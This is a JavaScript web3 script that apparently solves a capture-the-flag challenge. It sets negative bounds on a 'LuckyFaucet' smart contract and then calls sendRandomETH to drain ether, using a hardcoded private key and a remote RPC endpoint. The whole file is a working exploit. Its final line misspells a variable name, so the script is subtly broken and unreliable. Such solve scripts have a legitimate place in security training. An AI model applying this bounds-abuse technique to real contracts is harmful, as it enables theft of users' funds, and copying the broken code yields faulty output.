const Web3 = require('web3');

const web3 = new Web3.Web3(new Web3.Web3.providers.HttpProvider('http://83.136.249.153:33087'));

const privateKey = '0xbcbd57858f1e0604060bc2e6e4075589c95cbfdf3c8f05dac5963ff129393f37'
const signer = web3.eth.accounts.privateKeyToAccount(privateKey);
const Setup_deployedAddress = '0x4e1CA36DbC9a3a5C46B32D664111CB87253b6582';
const LuckyFaucet_deployedAddress = '0xC6F79C7Daf5943FC196C7d41f1A8F6802Db93D49';

const Setup_abi = require('./Setup_sol_Setup.json');
const SetupContract = new web3.eth.Contract(Setup_abi, Setup_deployedAddress);
const LuckyFaucet_abi = require('./LuckyFaucet_sol_LuckyFaucet.json');
const LuckyFaucetContract = new web3.eth.Contract(LuckyFaucet_abi, LuckyFaucet_deployedAddress);

function getBalance(address) {
  web3.eth.getBalance(address)
    .then(balance => {
      const etherBalance = web3.utils.fromWei(balance, 'ether');
      console.log(`Balance of ${address}: ${etherBalance} ETH`);
    })
    .catch(error => console.error('Error getting balance:', error));
}

async function callIsSolved() {
  return SetupContract.methods.isSolved().call();
}

async function getBounds() {
    await LuckyFaucetContract.methods.lowerBound().call().then(
      value => console.log('lowerBound: ', value)
    ).catch(error => console.error('Error calling lowerBound: ', error));

    await LuckyFaucetContract.methods.upperBound().call().then(
        value => console.log('upperBound: ', value)
      ).catch(error => console.error('Error calling upperBound: ', error));
  }

async function callSetBounds(lower, upper) {
  await LuckyFaucetContract.methods.setBounds(lower, upper).send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('setBounds: ', value.events)
  ).catch(error => console.error('Error calling setBounds: ', error));
}

async function callSendRandomETH() {
  await LuckyFaucetContract.methods.sendRandomETH().send({
      from: signer.address,
      gas: 1000000,
    }).then(
    value => console.log('sendRandomETH: ', value.events)
  ).catch(error => console.error('Error calling sendRandomETH: ', error));
}

async function exploit() {
  var solved = await callIsSolved()
  await getBounds()
  getBalance(signer.address)
  getBalance(LuckyFaucet_deployedAddress);

  var lower = -2;
  var upper = -1;
  console.log(`Solved: `, solved)
  await callSetBounds(lower, upper)
  await getBounds()
  await callSendRandomETH()

  getBalance(signer.address)
  getBalance(LuckyFaucete_deployedAddress);
}

exploit()